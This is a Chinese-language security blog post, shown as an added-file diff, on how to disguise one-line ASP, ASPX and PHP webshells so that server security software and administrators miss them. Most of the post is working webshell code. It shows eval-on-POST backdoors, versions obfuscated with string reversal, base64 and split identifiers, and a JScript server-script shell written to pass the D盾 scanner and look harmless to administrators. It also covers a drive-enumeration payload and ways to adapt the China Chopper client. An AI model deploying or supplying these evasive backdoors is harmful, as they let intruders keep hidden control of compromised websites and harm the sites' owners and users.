@@ -1,0 +1,138 @@
+<h2>0x00 背景</h2>
+<hr />
+<p>话说现在针对Web端文件代码检测的服务器安全类软件已经非常普及了，常见的有阿D保护盾、安全狗、护卫神、360网站卫士。它们所拥有的功能也大致相同，如：</p>
+<pre><code>+---------------------㈠----------------------+&nbsp;&nbsp;
+|① 检查SQL注入                                |&nbsp;&nbsp;
+|② 检查XSS代码                                |&nbsp;&nbsp;
+|③ 检查网站中有危险代码的文件      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    |&nbsp;&nbsp;
+|④ 数据库权限管理、风险行为检查    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |&nbsp;&nbsp;
++---------------------㈡----------------------+&nbsp;&nbsp;
+|⑤ 网站流量监控                               |&nbsp;&nbsp;
+|⑥ 网站日志管理                               |&nbsp;&nbsp;
+|⑦ 系统进程管理                               |&nbsp;&nbsp;
+|⑧ 端口状态查看                               |&nbsp;&nbsp;
+|⑨ 系统账号、特殊位置文件检查      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   |&nbsp;&nbsp;
+|⑩ 防御ddos、cc攻击                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;
+|   ……                                       |&nbsp;&nbsp;
++-------------------------------------------+&nbsp;&nbsp;
+</code></pre>
+<p><span id="more-839"></span></p>
+<p>可以将这些功能按下面进行分类:</p>
+<pre><code>                                    +----(检测Get内容)&nbsp;&nbsp;
+                                    |&nbsp;&nbsp;
+                 +----(未入侵)-------|----(检测Post内容)&nbsp;&nbsp;
+                 |                  |&nbsp;&nbsp;
+                 |                  +----(检测Http请求头、请求频率等)&nbsp;&nbsp;
+安全类软件--|&nbsp;&nbsp;
+                 |                  +----(日志审查分析)&nbsp;&nbsp;
+                 |                  |&nbsp;&nbsp;
+                 +----(已入侵)-------|----(后门检测清除)&nbsp;&nbsp;
+                                    |&nbsp;&nbsp;
+                                    +----(系统安全加固)
+</code></pre>
+<p>本文所针对的情况是：在已取得Webshell（一句话）[为什么不是大马呢，因为大马被杀的机率更高]的情况下绕过网站安全类软件的检测成功执行任意代码。</p>
+<h2>0x01 技术细节</h2>
+<hr />
+<p>要让“一句话”可以接收代码、执行代码、返回结果，首先要具备的条件是“一句话”已经通过检查。好吧，少说废话，开始行动吧！</p>
+<p>已准备工具：</p>
+<p>D盾_Web查杀(D盾杀的Shell比较全)</p>
+<p>ASP、ASPX、PHP原生态无污染一句话</p>
+<pre><code>&lt;%eval request("z")%&gt;；
+&lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["z"],"unsafe");%&gt;；
+&lt;?php @eval($_POST['z']);?&gt;
+</code></pre>
+<p>来看一下D盾对原生一句话的查杀情况吧！</p>
+<p><img src="http://static.wooyun.org/201312/2013122817573781043.jpg" alt="2013122817573781043.jpg" /></p>
+<p>Shit!，级别为5(eval后门)全部杀掉！这样也就是说即使你的一句话已经躺在目标网站目录了，访问的时候也会被WAF断掉连接。这样一句话本身也就失去意义了，更别说去使用它了。</p>
+<p>那么这种情况下该怎么做呢？我的答案是：就像Windows下做exe的免杀一样，找到杀软件杀掉的特征码然后改掉或是绕过。当然免杀Shell比免杀exe简单的多了……</p>
+<p>开始对我们的一句话做“免杀”吧！在此之前先来了解一句话木马的原理。对比下asp、aspx、php一句话，你发现了什么？</p>
+<p><img src="http://static.wooyun.org/201312/2013122818002311061.jpg" alt="2013122818002311061.jpg" /></p>
+<p>看到了吧，不同语言的一句话构成几乎完全一致！(首先请求客户端数据，然后执行请求到的数据)至于执行数据的来源，可以是Post，也可以是Get、cookies、session等(依然是Post、Get)；如果考虑到数据长度、编码、隐蔽性等诸多因素当然还是使用Post方法最为合适。</p>
+<p>那么服务器安全类软件杀的究竟是什么东东呢？前面说过了：“特征”，我们来做如下测试：</p>
+<p><img src="http://static.wooyun.org/201312/2013122818021354299.jpg" alt="2013122818021354299.jpg" /></p>
+<p>我把Request/POST前随便加了一个字符，再扫一扫，结果如上图。可见安全类软件杀掉的不是eval(execute/executeglobal/assert……)，而是eval+"请求数据"。当脚本内有eval字串时仅仅只是提醒而已(如果连执行函数都杀，那“上帝”造它干吗！)。但是上图中的三个脚本没一个是可以正常执行的，哪有srequest呢！</p>
+<p>这样我们就没招了吗？答案是否定的！我们可以用这样的方式来绕一绕：[exec decoding(excoding)]=》伪代码。其中excoding为已经编码了的原生一句话。encode和decode函数自己创造吧……</p>
+<p>经过一番功夫，我把Shell代码改造如下(当然如下代码都不是最好的，因为我有点懒):</p>
+<p>ASP:</p>
+<pre class="brush: php; notranslate">&lt;%
+Function MorfiCode(Code)
+&nbsp;&nbsp;&nbsp;&nbsp;MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
+End Function
+Execute MorfiCode(")/*/z/*/(tseuqer lave")
+%&gt;
+</pre>
+<p>ASPX:</p>
+<pre class="brush: php; notranslate">&lt;script runat="server" language="Jscript"&gt;
+function popup(str){
+&nbsp;&nbsp;&nbsp;&nbsp;var q = "u";
+&nbsp;&nbsp;&nbsp;&nbsp;var w = "afe";
+&nbsp;&nbsp;&nbsp;&nbsp;var a = q + "ns" + w;
+&nbsp;&nbsp;&nbsp;&nbsp;var b = eval(str,a);
+&nbsp;&nbsp;&nbsp;&nbsp;return(b);
+}
+&lt;/script&gt;
+&lt;%
+popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0="))));
+%&gt;
+</pre>
+<p>PHP</p>
+<pre class="brush: php; notranslate">&lt;?php
+$mujj = $_POST['z'];
+if($mujj!="")
+{
+&nbsp;&nbsp;&nbsp;&nbsp;$xsser = base64_decode($_POST['z0']);
+&nbsp;&nbsp;&nbsp;&nbsp;@eval("\$safedg = $xsser;")
+}
+?&gt;
+</pre>
+<p>效果呢，如下图：</p>
+<p><img src="http://static.wooyun.org/201312/2013122818065476520.jpg" alt="2013122818065476520.jpg" /></p>
+<p>实测至此与Shell的连接已经不会被断了，而且以上三个一句话都支持我们亲爱的“菜刀”连接。但实际上你用菜刀是连不上的，因为安全类软件还会检测Get、Post、Cookies……的内容，菜刀Post数据包中含有太多的关键字(execute、response.write,base64_decode…… 不信你截包看一看)。这样有什么方法来突破呢？哈哈，两种方法：</p>
+<p>一、反汇编改造“菜刀”(依然会有特征)       详见：<a href="http://zone.wooyun.org/content/8169">http://zone.wooyun.org/content/8169</a><br />
+二、自己写个“菜刀”(可完全没有任何特征)   详见：<a href="http://zone.wooyun.org/content/8137">http://zone.wooyun.org/content/8137</a></p>
+<pre><code>                    代码自定义编码后发送&nbsp;&nbsp;
+菜刀(客户端)《================================》一句话(服务端)&nbsp;&nbsp;
+                 &nbsp;&nbsp;解码后执行返回(编码)数据
+</code></pre>
+<p>现在，我们已经可以使用“菜刀”管理有网站安全类软件的站点了，可美中不足的是依然会被提示Execute/eval/base64_decode加密。因为正常情况下很少有用到eval/execute/executeglobal……函数(有经验的管理直接搜索eval、execute、assert等，见到包含在<%%>、<?php?>就删……)，那该怎么办才能忽悠住管理员让他保留我们的Shell呢？当然有答案，你可以构造一个注入或是文件上传，用到的时候再搞上自己的Shell，但我的目标是让我的一句话极具迷惑性(狗、神、盾、卫士哥不杀；管理员看不出这是一句话)。</p>
+<p>在这种情况下，可能要面临一个艰难的决定：放弃我们的“菜刀”，客户端全部自写。把eval等关键代码全部写到标签内，因为安全类软件对标签内代码的检测较宽松，对<code>&lt;%%&gt;</code>、<code>&lt;?php ?&gt;</code>等脚本标记内代码的正则检测较为严格。像<code>&lt;SCRIPT language=VBScript runat="server"&gt;</code>代码<code>&lt;/SCRIPT&gt;</code>这样的之前可以用来完美“免杀”现在已经不行了，但我们还有JScript呀！所以我采用了冰狐：<code>&lt;SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT&gt;eval(Request.form('#')+'')&lt;/SCRIPT&gt;</code>，重点对其进行改造！谁会注意LANGUAGE=JAVASCRIPT呢？</p>
+<p>经过一番改造，最终代码如下：</p>
+<pre><code>&lt;SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT&gt; var P = Request.form('z'); var Wab = {'E' : eval}; Wab.E(P+''); &lt;/SCRIPT&gt;
+</code></pre>
+<p>看一下效果吧……</p>
+<p><img src="http://static.wooyun.org/201312/2013122818143369499.jpg" alt="2013122818143369499.jpg" /></p>
+<p>D盾已经没有任何提示了！那么该怎么用这个一句话呢？已经说过了无法使用“菜刀连接”。好吧，火狐中选post一段代码到这个一句话试试……</p>
+<p><img src="http://static.wooyun.org/201312/2013122818151026774.jpg" alt="2013122818151026774.jpg" /></p>
+<p>当然不仅限于显示网站路径，任意代码哦！试试：</p>
+<pre><code>try{var S="-&gt;|"+Server.Mappath("/")+"\t";var oFso = Server.CreateObject("Scripting.FileSystemObject");var oDrivers = oFso.Drives;for(var x=new Enumerator(oDrivers);!x.atEnd();x.moveNext()) {var oDriver = x.item();S+=oDriver.Path;}S+="|&lt;-";Response.write(S);}catch(e){}
+</code></pre>
+<p><img src="http://static.wooyun.org/201312/2013122818165995078.jpg" alt="2013122818165995078.jpg" /></p>
+<p>这个一句话已经满足我们的所有要求了，但是你会说它依然不完美，因为它不支持Chopper！好吧，那就再费心改造一下吧…… 经过改造后的Shell代码如下：</p>
+<pre><code>&lt;SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT&gt;
+&nbsp;&nbsp;&nbsp;&nbsp;var Sp = Request.form('z');
+&nbsp;&nbsp;&nbsp;&nbsp;var Fla = {'E' : eval};
+&nbsp;&nbsp;&nbsp;&nbsp;var St=""
+&nbsp;&nbsp;&nbsp;&nbsp;var A="XX代码";
+&nbsp;&nbsp;&nbsp;&nbsp;var B="XX代码";
+&nbsp;&nbsp;&nbsp;&nbsp;var C="XXXXXX"; ……
+&nbsp;&nbsp;&nbsp;&nbsp;switch(Sp) { case "A": St=A; break; case "B": St=B; break; case "C": St=C; break; case "D": St=D; case "E": St=E; break; …… default:} Fla.E(St+'');
+&lt;/SCRIPT&gt; 
+</code></pre>
+<p>这样就可以使用“菜刀”连接了(我省略了代码，精简了重点部分上面只是个示例。)</p>
+<p>好吧，ASP一句话到这已经玩的很开心了，那接下来说下ASPX、PHP吧，是这样的，我不懂.net编程，也不懂PHP编程。自己顶多也就算是个无证&amp;业余程序猿，所以从这往下所述的您能看就看，不能看就使劲吐槽！！！！！</p>
+<p>总的来说上面的ASPX一句话已经够玩了，但是如果您是个追求完美的人，您可以将您的代码编译入Dll，然后放入bin目录(lake2 N年前不就这么做了吗：WebAdmin 2.Y详见：<a href="http://blog.csdn.net/lake2/article/details/575602">http://blog.csdn.net/lake2/article/details/575602</a>),dll中的代码用记事本能看吗！更别提杀了……</p>
+<p>最后来说一下PHP吧，变形方法和ASP、ASPX的没什么两样。您可以将代码写入&lt;script language=php></script>标签内以增大迷惑性，但这一招和ASP的vbscript一样对于安全类软件早已经失效，没说它们视如<?php ?>所以呢，看实际情况和使用的地方了，自己选择。</p>
+<p>通过简单的变量传递便可以实现免杀(php语法真的好灵活，能免的连个毛都不剩下)……<br />
+我使用如下代码作为一句话：</p>
+<pre class="brush: php; notranslate">&lt;?php
+$x=$_POST['z'];
+@eval("\$safedg = $x;");&nbsp;&nbsp;
+?&gt;
+</pre>
+<p>当然您不满意的话可以继续搞，连eval都给拆了！使用preg&#95;replace、array&#95;map或是从REQUEST的变量中取得eval、assert……，实没D盾都会有不同等级的报告(提示可疑但不认识，毕竟这些不常用函数都挺有风险……)，我是挺懒，不想搞了……<br />
+看效果：</p>
+<p><img src="http://static.wooyun.org/201312/2013122818201195763.jpg" alt="2013122818201195763.jpg" /></p>
+<p>关于如何玩转一句话已经写的差不多了(本人水平问题ASPX、PHP未能写的更详细！以后补充……)。如果将来一句话因为关键字被杀实再玩不鸟了(可能性不太大)，那就转业自写Customize脚本吧，至少文件读写，数据库连接这些功能是不会被杀的。</p>
+<p>参考：</p>
+<p><a href="http://qqhack8.blog.163.com/blog/static/114147985201211292209893/">http://qqhack8.blog.163.com/blog/static/114147985201211292209893/</a></p>
+<p><a href="http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63">http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63</a></p></div>
